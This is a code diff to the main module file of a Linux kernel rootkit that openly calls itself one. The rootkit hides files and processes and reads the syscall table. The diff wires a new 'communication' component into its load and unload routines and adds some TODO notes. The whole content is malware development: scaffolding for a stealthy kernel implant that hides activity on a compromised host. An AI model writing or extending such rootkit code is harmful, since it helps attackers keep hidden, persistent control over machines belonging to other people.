@@ -10,6 +10,8 @@
 #include "fileHide.h"
 #include "outputDevice.h"
 #include "processHider.h"
+#include "communication.h"
+
 
 //TODO: rename this to if wanting to be able to remove rootkit
 #define DEV_MODE
@@ -21,7 +23,11 @@ static int __init main_init(void) {
 	printInfo("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
 	printInfo("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
 
+	error = communication_init();
+	if (error) return error;
 
+
+	//TODO: eventually remove output device
    error = outputDevice_init();
    if (error) return error;
 
@@ -43,6 +49,7 @@ static int __init main_init(void) {
 	return 0;
 }
 
+//TODO: have things end in the reverse order to what they start in
 static void __exit main_exit(void) {
 	
  	fileHide_stop();
@@ -52,6 +59,8 @@ static void __exit main_exit(void) {
 #endif
  	outputDevice_exit();
 	processHider_exit();
+
+	communication_exit();
 
 	printInfo(KERN_INFO "Rootkit uninstalled\n");
 }
